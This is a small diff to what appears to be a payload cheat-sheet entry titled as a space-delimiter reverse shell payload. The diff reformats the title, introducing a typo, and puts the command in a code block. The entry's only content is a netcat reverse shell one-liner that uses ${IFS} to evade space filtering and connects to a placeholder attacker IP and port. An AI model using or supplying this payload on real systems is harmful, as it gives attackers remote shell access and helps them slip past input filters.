@@ -1,3 +1,5 @@
-# SPACE DELIMITER REVERSE SHELL PAYLOAD
+# Space Delimiter Rreverse Shell Payload
 
-### nc${IFS}MY_IP${IFS}MY_PORT${IFS}-e${IFS}/bin/sh
+### Payload
+
+    nc${IFS}MY_IP${IFS}MY_PORT${IFS}-e${IFS}/bin/sh
